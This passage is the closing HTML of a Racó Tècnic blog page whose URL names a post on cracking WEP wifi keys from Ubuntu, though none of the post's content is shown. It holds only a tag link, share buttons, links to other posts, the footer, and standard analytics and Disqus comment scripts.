            <a href="//elboletaire.github.io/racotecnic/etiqueta/WEP" title="Pages tagged WEP" class="tag">
                <span class="term">WEP</span>
            </a>
            
            
        </span>
        
        <div class="social-share">
  <ul class="socialcount socialcount-small inline-list">
    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=//elboletaire.github.io/racotecnic/2009/03/crackear-redes-wifi-con-clave-wep-desde-ubuntu-linux/" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=//elboletaire.github.io/racotecnic/2009/03/crackear-redes-wifi-con-clave-wep-desde-ubuntu-linux/" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
    <li class="googleplus"><a href="https://plus.google.com/share?url=//elboletaire.github.io/racotecnic/2009/03/crackear-redes-wifi-con-clave-wep-desde-ubuntu-linux/" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
  </ul>
</div><!-- /.social-share -->
      </footer>
    </div><!-- /.entry-content -->
    <section id="disqus_thread"></section><!-- /#disqus_thread -->
    <div class="read-more">
  
    <div class="read-more-header">
      <a href="//elboletaire.github.io/racotecnic/2009/03/rango-dinamico-y-bit-depth-esos-grandes-desconocidos/" class="read-more-btn">Read More</a>
    </div><!-- /.read-more-header -->
    <div class="read-more-content">
      <h3><a href="//elboletaire.github.io/racotecnic/2016/05/guarda-gratis-en-la-nube-tus-partidas-guardadas-o-como-hacer-copias-de-seguridad-en-la-nube-gratis/" title="Guarda GRATIS en la nube tus partidas guardadas o cómo hacer copias de seguridad en la nube gratis">Guarda GRATIS en la nube tus partidas guardadas o cómo hacer copias de seguridad en la nube gratis</a></h3>
      <p>Ya hace unos años que hago esto y la verdad es que es muy práctico. Consistebásicamente en subir automáticamente las partidas guardadas a...&hellip; <a href="//elboletaire.github.io/racotecnic/2016/05/guarda-gratis-en-la-nube-tus-partidas-guardadas-o-como-hacer-copias-de-seguridad-en-la-nube-gratis/">Continue reading</a></p>
    </div><!-- /.read-more-content -->
  
  <div class="read-more-list">
    
      <div class="list-item">
        <h4><a href="//elboletaire.github.io/racotecnic/2015/03/instalacion-wamp-a-pelo-con-multiples-versiones-de-php/" title="Instalación WAMP a pelo con múltiples versiones de PHP o cómo configurar Apache para correr varias versiones de PHP en distintos servidores virtuales">Instalación WAMP a pelo con múltiples versiones de PHP o cómo configurar Apache para correr varias versiones de PHP en distintos servidores virtuales</a></h4>
        <span>Published on March 16, 2015</span>
      </div><!-- /.list-item -->
    
      <div class="list-item">
        <h4><a href="//elboletaire.github.io/racotecnic/2014/01/ordenar-por-columnas-en-laravel-4-o-como-extender-laravel-4-a-nuestro-gusto/" title="Ordenar por columnas en Laravel 4 o cómo extender Laravel 4 a tu gusto">Ordenar por columnas en Laravel 4 o cómo extender Laravel 4 a tu gusto</a></h4>
        <span>Published on January 18, 2014</span>
      </div><!-- /.list-item -->
    
  </div><!-- /.read-more-list -->
</div><!-- /.read-more -->
  </article>
</div><!-- /#main -->

<div class="footer-wrapper">
  <footer role="contentinfo">
    <span>&copy; 2017 Racó Tècnic. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/hpstr-jekyll-theme/" rel="nofollow">HPSTR Theme</a>.</span>
  </footer>
</div><!-- /.footer-wrapper -->

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="//elboletaire.github.io/racotecnic/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
<script src="//elboletaire.github.io/racotecnic/assets/js/scripts.min.js"></script>


<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-106861877-1', 'auto');  
  ga('require', 'linkid', 'linkid.js');
  ga('send', 'pageview');
</script>



    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'racotecnic'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


</body>
</html>
